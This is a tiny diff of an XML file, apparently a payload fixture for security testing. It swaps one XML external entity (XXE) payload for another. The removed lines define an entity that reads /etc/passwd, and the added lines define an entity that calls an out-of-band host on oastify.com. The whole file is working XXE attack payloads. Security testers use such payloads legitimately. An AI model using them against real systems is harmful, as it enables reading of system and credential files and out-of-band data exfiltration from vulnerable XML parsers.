@@ -1,5 +1,4 @@
 <?xml version="1.0"?>
-<!DOCTYPE data [
-<!ELEMENT data (#ANY)>
-<!ENTITY file SYSTEM "file:///etc/passwd">]>
-<data>&file;</data>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "http://200chywrmzrmgefop3z28vs0frll9dx2.oastify.com/text.txt">]><foo>&xxe;</foo>
